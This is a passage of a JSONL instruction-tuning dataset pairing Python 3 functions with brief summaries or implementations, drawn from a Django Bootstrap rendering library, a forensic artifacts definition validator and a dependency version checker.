== \"small\":\n        pagination_css_classes.append(\"pagination-sm\")\n    elif size == \"large\":\n        pagination_css_classes.append(\"pagination-lg\")\n        # Build context object\n    return {\n        \"bootstrap_pagination_url\": url,\n        \"num_pages\": num_pages,\n        \"current_page\": current_page,\n        \"first_page\": first_page,\n        \"last_page\": last_page,\n        \"pages_shown\": pages_shown,\n        \"pages_back\": pages_back,\n        \"pages_forward\": pages_forward,\n        \"pagination_css_classes\": \" \".join(pagination_css_classes),\n        \"parameter_name\": parameter_name,\n    }"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef handle_var(value, context):\n    # Resolve FilterExpression and Variable immediately\n    if isinstance(value, FilterExpression) or isinstance(value, Variable):\n        return value.resolve(context)\n    # Return quoted strings unquoted\n    # http://djangosnippets.org/snippets/886\n    stringval = QUOTED_STRING.search(value)\n    if stringval:\n        return stringval.group(\"noquotes\")\n    # Resolve variable or return string value\n    try:\n        return Variable(value).resolve(context)\n    except VariableDoesNotExist:\n        return value", "response": "Handle variable in template tag."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses the contents of a template tag.", "response": "def parse_token_contents(parser, token):\n    \"\"\"\n    Parse template tag contents\n    \"\"\"\n    bits = token.split_contents()\n    tag = bits.pop(0)\n    args = []\n    kwargs = {}\n    asvar = None\n    if len(bits) >= 2 and bits[-2] == \"as\":\n        asvar = bits[-1]\n        bits = bits[:-2]\n    for bit in bits:\n        match = kwarg_re.match(bit)\n        if not match:\n            raise TemplateSyntaxError('Malformed arguments to tag \"{}\"'.format(tag))\n        name, value = match.groups()\n        if name:\n            kwargs[name] = parser.compile_filter(value)\n        else:\n            args.append(parser.compile_filter(value))\n    return {\"tag\": tag, \"args\": args, \"kwargs\": kwargs, \"asvar\": asvar}"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nturns a string into a list of CSS classes", "response": "def split_css_classes(css_classes):\n    \"\"\"\n    Turn string into a list of CSS classes\n    \"\"\"\n    classes_list = text_value(css_classes).split(\" \")\n    return [c for c in classes_list if c]"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef add_css_class(css_classes, css_class, prepend=False):\n    classes_list = split_css_classes(css_classes)\n    classes_to_add = [c for c in split_css_classes(css_class) if c not in classes_list]\n    if prepend:\n        classes_list = classes_to_add + classes_list\n    else:\n        classes_list += classes_to_add\n    return \" \".join(classes_list)", "response": "Adds a CSS class to a string of CSS classes\n   "}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef remove_css_class(css_classes, css_class):\n    remove = set(split_css_classes(css_class))\n    classes_list = [c for c in split_css_classes(css_classes) if c not in remove]\n    return \" \".join(classes_list)", "response": "Remove a CSS class from a string of CSS classes"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef render_link_tag(url, rel=\"stylesheet\", media=None):\n    url_dict = url_to_attrs_dict(url, url_attr=\"href\")\n    url_dict.setdefault(\"href\", url_dict.pop(\"url\", None))\n    url_dict[\"rel\"] = rel\n    if media:\n        url_dict[\"media\"] = media\n    return render_tag(\"link\", attrs=url_dict, close=False)", "response": "Build a link tag with url and optional media."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef render_tag(tag, attrs=None, content=None, close=True):\n    builder = \"<{tag}{attrs}>{content}\"\n    if content or close:\n        builder += \"</{tag}>\"\n    return format_html(\n        builder,\n        tag=tag,\n        attrs=mark_safe(flatatt(attrs)) if attrs else \"\",\n        content=text_value(content),\n    )", "response": "Render a HTML tag"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nrenders a Template to unicode", "response": "def render_template_file(template, context=None):\n    \"\"\"\n    Render a Template to unicode\n    \"\"\"\n    assert isinstance(context, Mapping)\n    template = get_template(template)\n    return template.render(context)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreplacing a GET parameter in an URL", "response": "def url_replace_param(url, name, value):\n    \"\"\"\n    Replace a GET parameter in an URL\n    \"\"\"\n    url_components = urlparse(force_str(url))\n    query_params = parse_qs(url_components.query)\n    query_params[name] = value\n    query = urlencode(query_params, doseq=True)\n    return force_text(\n        urlunparse(\n            [\n                url_components.scheme,\n                url_components.netloc,\n                url_components.path,\n                url_components.params,\n                query,\n                url_components.fragment,\n            ]\n        )\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef url_to_attrs_dict(url, url_attr):\n    result = dict()\n    # If url is not a string, it should be a dict\n    if isinstance(url, six.string_types):\n        url_value = url\n    else:\n        try:\n            url_value = url[\"url\"]\n        except TypeError:\n            raise BootstrapError(\n                'Function \"url_to_attrs_dict\" expects a string or a dict with key \"url\".'\n            )\n        crossorigin = url.get(\"crossorigin\", None)\n        integrity = url.get(\"integrity\", None)\n        if crossorigin:\n            result[\"crossorigin\"] = crossorigin\n        if integrity:\n            result[\"integrity\"] = integrity\n    result[url_attr] = url_value\n    return result", "response": "Convert a url dict to a dict with the given url_attr."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nrendering a formset to a Bootstrap layout", "response": "def render_formset(formset, **kwargs):\n    \"\"\"\n    Render a formset to a Bootstrap layout\n    \"\"\"\n    renderer_cls = get_formset_renderer(**kwargs)\n    return renderer_cls(formset, **kwargs).render()"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nrenders formset errors to a Bootstrap layout", "response": "def render_formset_errors(formset, **kwargs):\n    \"\"\"\n    Render formset errors to a Bootstrap layout\n    \"\"\"\n    renderer_cls = get_formset_renderer(**kwargs)\n    return renderer_cls(formset, **kwargs).render_errors()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nrender a form to a Bootstrap layout", "response": "def render_form(form, **kwargs):\n    \"\"\"\n    Render a form to a Bootstrap layout\n    \"\"\"\n    renderer_cls = get_form_renderer(**kwargs)\n    return renderer_cls(form, **kwargs).render()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef render_form_errors(form, error_types=\"non_field_errors\", **kwargs):\n    renderer_cls = get_form_renderer(**kwargs)\n    return renderer_cls(form, **kwargs).render_errors(error_types)", "response": "Render form errors to a Bootstrap layout"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nrendering a field to a Bootstrap layout", "response": "def render_field(field, **kwargs):\n    \"\"\"\n    Render a field to a Bootstrap layout\n    \"\"\"\n    renderer_cls = get_field_renderer(**kwargs)\n    return renderer_cls(field, **kwargs).render()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef render_label(content, label_for=None, label_class=None, label_title=\"\"):\n    attrs = {}\n    if label_for:\n        attrs[\"for\"] = label_for\n    if label_class:\n        attrs[\"class\"] = label_class\n    if label_title:\n        attrs[\"title\"] = label_title\n    return render_tag(\"label\", attrs=attrs, content=content)", "response": "Render a label with content"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nrender a button with content.", "response": "def render_button(\n    content,\n    button_type=None,\n    icon=None,\n    button_class=\"btn-default\",\n    size=\"\",\n    href=\"\",\n    name=None,\n    value=None,\n    title=None,\n    extra_classes=\"\",\n    id=\"\",\n):\n    \"\"\"\n    Render a button with content\n    \"\"\"\n    attrs = {}\n    classes = add_css_class(\"btn\", button_class)\n    size = text_value(size).lower().strip()\n    if size == \"xs\":\n        classes = add_css_class(classes, \"btn-xs\")\n    elif size == \"sm\" or size == \"small\":\n        classes = add_css_class(classes, \"btn-sm\")\n    elif size == \"lg\" or size == \"large\":\n        classes = add_css_class(classes, \"btn-lg\")\n    elif size == \"md\" or size == \"medium\":\n        pass\n    elif size:\n        raise BootstrapError(\n            'Parameter \"size\" should be \"xs\", \"sm\", \"lg\" or '\n            + 'empty (\"{}\" given).'.format(size)\n        )\n    if button_type:\n        if button_type not in (\"submit\", \"reset\", \"button\", \"link\"):\n            raise BootstrapError(\n                'Parameter \"button_type\" should be \"submit\", \"reset\", '\n                + '\"button\", \"link\" or empty  (\"{}\" given).'.format(button_type)\n            )\n        attrs[\"type\"] = button_type\n    classes = add_css_class(classes, extra_classes)\n    attrs[\"class\"] = classes\n    icon_content = render_icon(icon) if icon else \"\"\n    if href:\n        attrs[\"href\"] = href\n        tag = \"a\"\n    else:\n        tag = \"button\"\n    if id:\n        attrs[\"id\"] = id\n    if name:\n        attrs[\"name\"] = name\n    if value:\n        attrs[\"value\"] = value\n    if title:\n        attrs[\"title\"] = title\n    return render_tag(\n        tag,\n        attrs=attrs,\n        content=mark_safe(text_concat(icon_content, content, separator=\" \")),\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef render_field_and_label(\n    field, label, field_class=\"\", label_for=None, label_class=\"\", layout=\"\", **kwargs\n):\n    \"\"\"\n    Render a field with its label\n    \"\"\"\n    if layout == \"horizontal\":\n        if not label_class:\n            label_class = get_bootstrap_setting(\"horizontal_label_class\")\n        if not field_class:\n            field_class = get_bootstrap_setting(\"horizontal_field_class\")\n        if not label:\n            label = mark_safe(\"&#160;\")\n        label_class = add_css_class(label_class, \"control-label\")\n    html = field\n    if field_class:\n        html = '<div class=\"{klass}\">{html}</div>'.format(klass=field_class, html=html)\n    if label:\n        html = render_label(label, label_for=label_for, label_class=label_class) + html\n    return html", "response": "Render a field with its label"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef is_widget_required_attribute(widget):\n    if not widget.is_required:\n        return False\n    if isinstance(widget, WIDGETS_NO_REQUIRED):\n        return False\n    return True", "response": "Is this widget required?"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nis this widget with a placeholder?", "response": "def is_widget_with_placeholder(widget):\n    \"\"\"\n    Is this a widget that should have a placeholder?\n    Only text, search, url, tel, e-mail, password, number have placeholders\n    \"\"\"\n    return isinstance(\n        widget, (TextInput, Textarea, NumberInput, EmailInput, URLInput, PasswordInput)\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _PrintDictAsTable(self, src_dict):\n    key_list = list(src_dict.keys())\n    key_list.sort()\n\n    print('|', end='')\n    for key in key_list:\n      print(' {0:s} |'.format(key), end='')\n    print('')\n\n    print('|', end='')\n    for key in key_list:\n      print(' :---: |', end='')\n    print('')\n\n    print('|', end='')\n    for key in key_list:\n      print(' {0!s} |'.format(src_dict[key]), end='')\n    print('\\n')", "response": "Prints a table of artifact definitions."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nprinting a summary table.", "response": "def PrintSummaryTable(self):\n    \"\"\"Prints a summary table.\"\"\"\n    print(\"\"\"\n\nAs of {0:s} the repository contains:\n\n| **File paths covered** | **{1:d}** |\n| :------------------ | ------: |\n| **Registry keys covered** | **{2:d}** |\n| **Total artifacts** | **{3:d}** |\n\"\"\".format(\n    time.strftime('%Y-%m-%d'), self.path_count, self.reg_key_count,\n    self.total_count))"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbuilds stats and print in MarkDown format.", "response": "def PrintStats(self):\n    \"\"\"Build stats and print in MarkDown format.\"\"\"\n    self.BuildStats()\n    self.PrintSummaryTable()\n    self.PrintSourceTypeTable()\n    self.PrintOSTable()\n    self.PrintLabelTable()"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef AsDict(self):\n    source_type_attributes = {'paths': self.paths}\n    if self.separator != '/':\n      source_type_attributes['separator'] = self.separator\n\n    return source_type_attributes", "response": "Represents a source type as a dictionary."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef ValidateKey(cls, key_path):\n    for prefix in cls.VALID_PREFIXES:\n      if key_path.startswith(prefix):\n        return\n\n    # TODO: move check to validator.\n    if key_path.startswith('HKEY_CURRENT_USER\\\\'):\n      raise errors.FormatError(\n          'HKEY_CURRENT_USER\\\\ is not supported instead use: '\n          'HKEY_USERS\\\\%%users.sid%%\\\\')\n\n    raise errors.FormatError(\n        'Unupported Registry key path: {0:s}'.format(key_path))", "response": "Validates this key against supported key names."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nrepresents a source type as a dictionary.", "response": "def AsDict(self):\n    \"\"\"Represents a source type as a dictionary.\n\n    Returns:\n      dict[str, str]: source type attributes.\n    \"\"\"\n    source_type_attributes = {'query': self.query}\n    if self.base_object:\n      source_type_attributes['base_object'] = self.base_object\n\n    return source_type_attributes"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef CreateSourceType(cls, type_indicator, attributes):\n    if type_indicator not in cls._source_type_classes:\n      raise errors.FormatError(\n          'Unsupported type indicator: {0:s}.'.format(type_indicator))\n\n    return cls._source_type_classes[type_indicator](**attributes)", "response": "Creates a source type."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef DeregisterSourceType(cls, source_type_class):\n    if source_type_class.TYPE_INDICATOR not in cls._source_type_classes:\n      raise KeyError(\n          'Source type not set for type: {0:s}.'.format(\n              source_type_class.TYPE_INDICATOR))\n\n    del cls._source_type_classes[source_type_class.TYPE_INDICATOR]", "response": "Deregisters a source type."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef RegisterSourceType(cls, source_type_class):\n    if source_type_class.TYPE_INDICATOR in cls._source_type_classes:\n      raise KeyError(\n          'Source type already set for type: {0:s}.'.format(\n              source_type_class.TYPE_INDICATOR))\n\n    cls._source_type_classes[source_type_class.TYPE_INDICATOR] = (\n        source_type_class)", "response": "Registers a source type."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _CheckMacOSPaths(self, filename, artifact_definition, source, paths):\n    result = True\n\n    paths_with_private = []\n    paths_with_symbolic_link_to_private = []\n\n    for path in paths:\n      path_lower = path.lower()\n      path_segments = path_lower.split(source.separator)\n      if not path_segments:\n        logging.warning((\n            'Empty path defined by artifact definition: {0:s} in file: '\n            '{1:s}').format(artifact_definition.name, filename))\n        result = False\n\n      elif len(path_segments) == 1:\n        continue\n\n      elif path_segments[1] in self._MACOS_PRIVATE_SUB_PATHS:\n        paths_with_symbolic_link_to_private.append(path)\n\n      elif path_segments[1] == 'private' and len(path_segments) >= 2:\n        if path_segments[2] in self._MACOS_PRIVATE_SUB_PATHS:\n          paths_with_private.append(path)\n\n        else:\n          logging.warning((\n              'Unsupported private path: {0:s} defined by artifact definition: '\n              '{1:s} in file: {2:s}').format(\n                  path, artifact_definition.name, filename))\n          result = False\n\n    for private_path in paths_with_private:\n      if private_path[8:] not in paths_with_symbolic_link_to_private:\n        logging.warning((\n            'Missing symbolic link: {0:s} for path: {1:s} defined by artifact '\n            'definition: {2:s} in file: {3:s}').format(\n                private_path[8:], private_path, artifact_definition.name,\n                filename))\n        result = False\n\n    for path in paths_with_symbolic_link_to_private:\n      private_path = '/private{0:s}'.format(path)\n      if private_path not in paths_with_private:\n        logging.warning((\n            'Missing path: {0:s} for symbolic link: {1:s} defined by artifact '\n            'definition: {2:s} in file: {3:s}').format(\n                private_path, path, artifact_definition.name, filename))\n        result = False\n\n    return result", "response": "Checks if the paths are valid MacOS paths."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nchecks if a path is a valid Windows path.", "response": "def _CheckWindowsPath(self, filename, artifact_definition, source, path):\n    \"\"\"Checks if a path is a valid Windows path.\n\n    Args:\n      filename (str): name of the artifacts definition file.\n      artifact_definition (ArtifactDefinition): artifact definition.\n      source (SourceType): source definition.\n      path (str): path to validate.\n\n    Returns:\n      bool: True if the Windows path is valid.\n    \"\"\"\n    result = True\n\n    number_of_forward_slashes = path.count('/')\n    number_of_backslashes = path.count('\\\\')\n    if (number_of_forward_slashes < number_of_backslashes and\n        source.separator != '\\\\'):\n      logging.warning((\n          'Incorrect path separator: {0:s} in path: {1:s} defined '\n          'by artifact definition: {2:s} in file: {3:s}').format(\n              source.separator, path, artifact_definition.name,\n              filename))\n      result = False\n\n    if source.separator != '\\\\':\n      return result\n\n    path_lower = path.lower()\n    path_segments = path_lower.split(source.separator)\n    if not path_segments:\n      logging.warning((\n          'Empty path defined by artifact definition: {0:s} in file: '\n          '{1:s}').format(artifact_definition.name, filename))\n      result = False\n\n    elif path_segments[0].startswith('%%users.') and path_segments[0] not in (\n        '%%users.appdata%%', '%%users.homedir%%', '%%users.localappdata%%',\n        '%%users.temp%%', '%%users.username%%', '%%users.userprofile%%'):\n      logging.warning((\n          'Unsupported \"{0:s}\" in path: {1:s} defined by artifact '\n          'definition: {2:s} in file: {3:s}').format(\n              path_segments[0], path, artifact_definition.name, filename))\n      result = False\n\n    elif path_segments[0] == '%%users.homedir%%':\n      logging.warning((\n          'Replace \"%%users.homedir%%\" by \"%%users.userprofile%%\" in path: '\n          '{0:s} defined by artifact definition: {1:s} in file: '\n          '{2:s}').format(path, artifact_definition.name, filename))\n      result = False\n\n    elif path_lower.startswith('%%users.userprofile%%\\\\appdata\\\\local\\\\'):\n      logging.warning((\n          'Replace \"%%users.userprofile%%\\\\AppData\\\\Local\" by '\n          '\"%%users.localappdata%%\" in path: {0:s} defined by artifact '\n          'definition: {1:s} in file: {2:s}').format(\n              path, artifact_definition.name, filename))\n      result = False\n\n    elif path_lower.startswith('%%users.userprofile%%\\\\appdata\\\\roaming\\\\'):\n      logging.warning((\n          'Replace \"%%users.userprofile%%\\\\AppData\\\\Roaming\" by '\n          '\"%%users.appdata%%\" in path: {0:s} defined by artifact '\n          'definition: {1:s} in file: {2:s}').format(\n              path, artifact_definition.name, filename))\n      result = False\n\n    elif path_lower.startswith('%%users.userprofile%%\\\\application data\\\\'):\n      logging.warning((\n          'Replace \"%%users.userprofile%%\\\\Application Data\" by '\n          '\"%%users.appdata%%\" in path: {0:s} defined by artifact '\n          'definition: {1:s} in file: {2:s}').format(\n              path, artifact_definition.name, filename))\n      result = False\n\n    elif path_lower.startswith(\n        '%%users.userprofile%%\\\\local settings\\\\application data\\\\'):\n      logging.warning((\n          'Replace \"%%users.userprofile%%\\\\Local Settings\\\\Application Data\" '\n          'by \"%%users.localappdata%%\" in path: {0:s} defined by artifact '\n          'definition: {1:s} in file: {2:s}').format(\n              path, artifact_definition.name, filename))\n      result = False\n\n    for path_segment in path_segments:\n      if path_segment.startswith('%%') and path_segment.endswith('%%'):\n        if (path_segment.startswith('%%environ_') and\n            path_segment not in self._SUPPORTED_WINDOWS_ENVIRONMENT_VARIABLES):\n          result = False\n          logging.warning((\n              'Artifact definition: {0:s} in file: {1:s} contains Windows '\n              'path that contains an unuspported environment variable: '\n              '\"{2:s}\".').format(\n                  artifact_definition.name, filename, path_segment))\n\n        elif (path_segment.startswith('%%users.') and\n              path_segment not in self._SUPPORTED_WINDOWS_USERS_VARIABLES):\n          result = False\n          logging.warning((\n              'Artifact definition: {0:s} in file: {1:s} contains Windows '\n              'path that contains an unsupported users variable: '\n              '\"{2:s}\". ').format(\n                  artifact_definition.name, filename, path_segment))\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nchecking if a path is a valid Windows Registry key path.", "response": "def _CheckWindowsRegistryKeyPath(\n      self, filename, artifact_definition, key_path):\n    \"\"\"Checks if a path is a valid Windows Registry key path.\n\n    Args:\n      filename (str): name of the artifacts definition file.\n      artifact_definition (ArtifactDefinition): artifact definition.\n      key_path (str): Windows Registry key path to validate.\n\n    Returns:\n      bool: True if the Windows Registry key path is valid.\n    \"\"\"\n    result = True\n    key_path_segments = key_path.lower().split('\\\\')\n\n    if key_path_segments[0] == '%%current_control_set%%':\n      result = False\n      logging.warning((\n          'Artifact definition: {0:s} in file: {1:s} contains Windows '\n          'Registry key path that starts with '\n          '%%CURRENT_CONTROL_SET%%. Replace %%CURRENT_CONTROL_SET%% with '\n          'HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet').format(\n              artifact_definition.name, filename))\n\n    for segment_index, key_path_segment in enumerate(key_path_segments):\n      if key_path_segment.startswith('%%') and key_path_segment.endswith('%%'):\n        if (segment_index == 1 and key_path_segment == '%%users.sid%%' and\n            key_path_segments[0] == 'hkey_users'):\n          continue\n\n        if key_path_segment.startswith('%%environ_'):\n          result = False\n          logging.warning((\n              'Artifact definition: {0:s} in file: {1:s} contains Windows '\n              'Registry key path that contains an environment variable: '\n              '\"{2:s}\". Usage of environment variables in key paths is not '\n              'encouraged at this time.').format(\n                  artifact_definition.name, filename, key_path_segment))\n\n        elif key_path_segment.startswith('%%users.'):\n          result = False\n          logging.warning((\n              'Artifact definition: {0:s} in file: {1:s} contains Windows '\n              'Registry key path that contains a users variable: \"{2:s}\". '\n              'Usage of users variables in key paths, except for '\n              '\"HKEY_USERS\\\\%%users.sid%%\", is not encouraged at this '\n              'time.').format(\n                  artifact_definition.name, filename, key_path_segment))\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nchecking if Registry key paths are not already defined by other artifacts.", "response": "def _HasDuplicateRegistryKeyPaths(\n      self, filename, artifact_definition, source):\n    \"\"\"Checks if Registry key paths are not already defined by other artifacts.\n\n    Note that at the moment this function will only find exact duplicate\n    Registry key paths.\n\n    Args:\n      filename (str): name of the artifacts definition file.\n      artifact_definition (ArtifactDefinition): artifact definition.\n      source (SourceType): source definition.\n\n    Returns:\n      bool: True if the Registry key paths defined by the source type\n          are used in other artifacts.\n    \"\"\"\n    result = False\n    intersection = self._artifact_registry_key_paths.intersection(\n        set(source.keys))\n    if intersection:\n      duplicate_key_paths = '\\n'.join(intersection)\n      logging.warning((\n          'Artifact definition: {0:s} in file: {1:s} has duplicate '\n          'Registry key paths:\\n{2:s}').format(\n              artifact_definition.name, filename, duplicate_key_paths))\n      result = True\n\n    self._artifact_registry_key_paths.update(source.keys)\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck the artifacts definition file for validity.", "response": "def CheckFile(self, filename):\n    \"\"\"Validates the artifacts definition in a specific file.\n\n    Args:\n      filename (str): name of the artifacts definition file.\n\n    Returns:\n      bool: True if the file contains valid artifacts definitions.\n    \"\"\"\n    result = True\n    artifact_reader = reader.YamlArtifactsReader()\n\n    try:\n      for artifact_definition in artifact_reader.ReadFile(filename):\n        try:\n          self._artifact_registry.RegisterDefinition(artifact_definition)\n        except KeyError:\n          logging.warning(\n              'Duplicate artifact definition: {0:s} in file: {1:s}'.format(\n                  artifact_definition.name, filename))\n          result = False\n\n        artifact_definition_supports_macos = (\n            definitions.SUPPORTED_OS_DARWIN in (\n                artifact_definition.supported_os))\n        artifact_definition_supports_windows = (\n            definitions.SUPPORTED_OS_WINDOWS in (\n                artifact_definition.supported_os))\n\n        for source in artifact_definition.sources:\n          if source.type_indicator in (\n              definitions.TYPE_INDICATOR_FILE, definitions.TYPE_INDICATOR_PATH):\n\n            if (definitions.SUPPORTED_OS_DARWIN in source.supported_os or (\n                artifact_definition_supports_macos and\n                not source.supported_os)):\n              if not self._CheckMacOSPaths(\n                  filename, artifact_definition, source, source.paths):\n                result = False\n\n            elif (artifact_definition_supports_windows or\n                  definitions.SUPPORTED_OS_WINDOWS in source.supported_os):\n              for path in source.paths:\n                if not self._CheckWindowsPath(\n                    filename, artifact_definition, source, path):\n                  result = False\n\n          elif source.type_indicator == (\n              definitions.TYPE_INDICATOR_WINDOWS_REGISTRY_KEY):\n\n            # Exempt the legacy file from duplicate checking because it has\n            # duplicates intentionally.\n            if (filename != self.LEGACY_PATH and\n                self._HasDuplicateRegistryKeyPaths(\n                    filename, artifact_definition, source)):\n              result = False\n\n            for key_path in source.keys:\n              if not self._CheckWindowsRegistryKeyPath(\n                  filename, artifact_definition, key_path):\n                result = False\n\n          elif source.type_indicator == (\n              definitions.TYPE_INDICATOR_WINDOWS_REGISTRY_VALUE):\n\n            for key_value_pair in source.key_value_pairs:\n              if not self._CheckWindowsRegistryKeyPath(\n                  filename, artifact_definition, key_value_pair['key']):\n                result = False\n\n    except errors.FormatError as exception:\n      logging.warning(\n          'Unable to validate file: {0:s} with error: {1!s}'.format(\n              filename, exception))\n      result = False\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef RegisterDefinition(self, artifact_definition):\n    artifact_definition_name = artifact_definition.name.lower()\n    if artifact_definition_name in self._artifact_definitions:\n      raise KeyError(\n          'Artifact definition already set for name: {0:s}.'.format(\n              artifact_definition.name))\n\n    self._artifact_definitions[artifact_definition_name] = artifact_definition\n    self._defined_artifact_names.add(artifact_definition.name)\n\n    for source in artifact_definition.sources:\n      if source.type_indicator == definitions.TYPE_INDICATOR_ARTIFACT_GROUP:\n        self._artifact_name_references.update(source.names)", "response": "Registers an artifact definition."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef ReadFromDirectory(self, artifacts_reader, path, extension='yaml'):\n    for artifact_definition in artifacts_reader.ReadDirectory(\n        path, extension=extension):\n      self.RegisterDefinition(artifact_definition)", "response": "Reads artifact definitions from a directory."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nread artifact definitions from a file into the registry.", "response": "def ReadFromFile(self, artifacts_reader, filename):\n    \"\"\"Reads artifact definitions into the registry from a file.\n\n    Args:\n      artifacts_reader (ArtifactsReader): an artifacts reader.\n      filename (str): name of the file to read from.\n    \"\"\"\n    for artifact_definition in artifacts_reader.ReadFile(filename):\n      self.RegisterDefinition(artifact_definition)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef ReadFileObject(self, artifacts_reader, file_object):\n    for artifact_definition in artifacts_reader.ReadFileObject(file_object):\n      self.RegisterDefinition(artifact_definition)", "response": "Reads artifact definitions from a file - like object."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _GetConfigValue(self, config_parser, section_name, value_name):\n    try:\n      return config_parser.get(section_name, value_name)\n    except configparser.NoOptionError:\n      return None", "response": "Retrieves a value from the config parser."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef Read(self, file_object):\n    config_parser = configparser.RawConfigParser()\n    # pylint: disable=deprecated-method\n    # TODO: replace readfp by read_file, check if Python 2 compatible\n    config_parser.readfp(file_object)\n\n    for section_name in config_parser.sections():\n      dependency_definition = DependencyDefinition(section_name)\n      for value_name in self._VALUE_NAMES:\n        value = self._GetConfigValue(config_parser, section_name, value_name)\n        setattr(dependency_definition, value_name, value)\n\n      yield dependency_definition", "response": "Reads dependency definitions from a file - like object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _CheckPythonModule(self, dependency):\n    module_object = self._ImportPythonModule(dependency.name)\n    if not module_object:\n      status_message = 'missing: {0:s}'.format(dependency.name)\n      return False, status_message\n\n    if not dependency.version_property:\n      return True, dependency.name\n\n    return self._CheckPythonModuleVersion(\n        dependency.name, module_object, dependency.version_property,\n        dependency.minimum_version, dependency.maximum_version)", "response": "Checks the availability of a Python module."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _CheckPythonModuleVersion(\n      self, module_name, module_object, version_property, minimum_version,\n      maximum_version):\n    \"\"\"Checks the version of a Python module.\n\n    Args:\n      module_object (module): Python module.\n      module_name (str): name of the Python module.\n      version_property (str): version attribute or function.\n      minimum_version (str): minimum version.\n      maximum_version (str): maximum version.\n\n    Returns:\n      tuple: consists:\n\n        bool: True if the Python module is available and conforms to\n            the minimum required version, False otherwise.\n        str: status message.\n    \"\"\"\n    module_version = None\n    if not version_property.endswith('()'):\n      module_version = getattr(module_object, version_property, None)\n    else:\n      version_method = getattr(\n          module_object, version_property[:-2], None)\n      if version_method:\n        module_version = version_method()\n\n    if not module_version:\n      status_message = (\n          'unable to determine version information for: {0:s}').format(\n              module_name)\n      return False, status_message\n\n    # Make sure the module version is a string.\n    module_version = '{0!s}'.format(module_version)\n\n    # Split the version string and convert every digit into an integer.\n    # A string compare of both version strings will yield an incorrect result.\n\n    # Strip any semantic suffixes such as a1, b1, pre, post, rc, dev.\n    module_version = self._VERSION_NUMBERS_REGEX.findall(module_version)[0]\n\n    if module_version[-1] == '.':\n      module_version = module_version[:-1]\n\n    try:\n      module_version_map = list(\n          map(int, self._VERSION_SPLIT_REGEX.split(module_version)))\n    except ValueError:\n      status_message = 'unable to parse module version: {0:s} {1:s}'.format(\n          module_name, module_version)\n      return False, status_message\n\n    if minimum_version:\n      try:\n        minimum_version_map = list(\n            map(int, self._VERSION_SPLIT_REGEX.split(minimum_version)))\n      except ValueError:\n        status_message = 'unable to parse minimum version: {0:s} {1:s}'.format(\n            module_name, minimum_version)\n        return False, status_message\n\n      if module_version_map < minimum_version_map:\n        status_message = (\n            '{0:s} version: {1!s} is too old, {2!s} or later required').format(\n                module_name, module_version, minimum_version)\n        return False, status_message\n\n    if maximum_version:\n      try:\n        maximum_version_map = list(\n            map(int, self._VERSION_SPLIT_REGEX.split(maximum_version)))\n      except ValueError:\n        status_message = 'unable to parse maximum version: {0:s} {1:s}'.format(\n            module_name, maximum_version)\n        return False, status_message\n\n      if module_version_map > maximum_version_map:\n        status_message = (\n            '{0:s} version: {1!s} is too recent, {2!s} or earlier '\n            'required').format(module_name, module_version, maximum_version)\n        return False, status_message\n\n    status_message = '{0:s} version: {1!s}'.format(module_name, module_version)\n    return True, status_message", "response": "Checks the version of a Python module."}
